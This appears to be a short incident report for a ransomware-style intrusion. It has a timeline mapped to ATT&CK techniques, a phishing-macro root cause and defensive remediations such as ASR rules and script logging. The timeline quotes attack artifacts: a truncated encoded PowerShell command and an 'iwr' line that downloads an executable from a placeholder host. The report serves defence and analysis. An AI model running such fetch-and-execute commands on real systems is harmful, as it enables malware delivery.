| Time | Event | Artifact | ATT&CK |
|---|---|---|---|
| 14:03 | Encoded PowerShell | -enc JABQ... | T1059.001 |
| 14:04 | Fetch payload | iwr http://x/p.exe | T1105 |
| 14:06 | Mass file writes | .lock files | T1486 |


**Root cause:** User executed malicious attachment from phishing email (macro). Missing ASR rule for Office child processes.


**Remediations:** Enable ASR `Block Office from creating child processes`, enforce Script Block Logging, EDR network containment.
